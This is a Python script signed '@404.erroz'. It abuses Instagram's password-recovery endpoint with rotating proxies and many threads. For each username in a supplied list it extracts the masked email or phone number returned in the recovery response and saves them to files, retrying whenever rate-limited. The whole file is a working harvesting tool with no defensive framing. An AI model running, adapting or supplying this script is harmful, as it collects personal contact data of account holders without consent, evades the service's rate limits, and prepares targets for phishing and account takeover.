import requests
from colorama import Fore , init , Style
from random import choice
from threading import Thread
import re
init()
#Codded By @404.erroz
urlig="https://www.instagram.com/accounts/account_recovery_send_ajax/"
hig = {
'UserAgent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
'X-CSRFToken':'missing',
'ContentType':'application/x-www-form-urlencoded'
}
NUM = 0
user = open("list.txt","r").read().splitlines()
proxy = open("proxy.txt","r").read().splitlines()
def method2(username):
        try:
           px=choice(proxy)
           proxx = {
               "http": "http://" + px,
               "https": "https://" + px,
           }
           postd = {
            'email_or_username': username,
            'recaptcha_challenge_field': ''
           }
           req = requests.post(
                               urlig,
                               data=postd,
                               headers=hig,
                               proxies=proxx,
                               timeout=4
                               ).text
           if ("Thanks") in req:
               regex_email = re.search(r'Thanks! Please check  (.*?) for a link',req).groups(0)[0]
               if '@'in regex_email:
                  user_email=f"{username}:{regex_email}"
                  print(f"{Fore.MAGENTA}[Email]{Style.RESET_ALL}- {username}:{regex_email}")
                  print(user_email, file=open("Info-Email.txt", "a"))
               else:
                   print(f"{Fore.YELLOW}[Phone]{Style.RESET_ALL}- {username}:{regex_email}")
                   print(f"{username}:{regex_email}",file=open('Info-Phone.txt','a'))
           elif ("No users found") in req :
               print(f"{Fore.RED}[Banned]{Style.RESET_ALL}- {username}")
           elif ("Please wait a few minutes before you try again.") in req:
               error = f'Error ---> {username}'
               print(error)
               method2(username)
        except Exception:
            method2(username)
def method1():
    global NUM
    while True:
        try:
            username = user[NUM]
            NUM += 1
            method2(username)
        except IndexError:
            ''
print(f'''{Fore.BLUE}   _____      _     _____        __        _____                _   
  / ____|    | |   |_   _|      / _|      |  __ \              | |  
 | |  __  ___| |_    | |  _ __ | |_ ___   | |__) |___  ___  ___| |_ 
 | | |_ |/ _ \ __|   | | | '_ \|  _/ _ \  |  _  // _ \/ __|/ _ \ __|
 | |__| |  __/ |_   _| |_| | | | || (_) | | | \ \  __/\__ \  __/ |_ 
  \_____|\___|\__| |_____|_| |_|_| \___/  |_|  \_\___||___/\___|\__|\n\n                    [ Codded By: @404.erroz ] \n--------------------------------------------------------------------- {Style.RESET_ALL}                                                                                                                                        ''')
thh=[]
tt=input('[+] Thread : ')
for az in range(int(tt)):
        t = Thread(target=method1)
        t.start()
        thh.append(t)
for th in thh:
        th.join()
